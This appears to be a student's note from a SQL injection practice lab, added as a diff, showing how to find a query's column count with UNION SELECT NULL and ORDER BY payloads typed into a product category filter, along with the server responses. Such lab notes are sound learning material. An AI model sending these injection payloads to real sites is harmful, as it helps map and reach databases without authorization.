@@ -1,0 +1,36 @@
+LAB DESCRIPTION
+SQLi vuln in product category filter. Result from query stored in app's response
+GOAL
+Determine no of columns retreived in the query using SQLi injection UNION attack
+
+PREREQUISITE
+
+TABLE1    TABLE 2
+a | b      c | d
+1, 2       5, 6
+3, 4       7, 8
+
+rule: The no and order of cols must be same in single query, also the data types should be same
+
+ANALYSIS
+
+# Method 1
+' UNION SELECT NULL--
+    <internal server error>
+' UNION SELECT NULL, NULL--
+    <internal server error>
+' UNION SELECT NULL, NULL, NULL--
+    got the product page as before
+so the no of cols = 3 
+
+# Method 2
+' ORDER BY 1--
+<ok>
+' ORDER BY 2--
+<ok>
+' ORDER BY 3--
+<ok>
+' ORDER BY 4--
+<Internal Server Error>
+
+
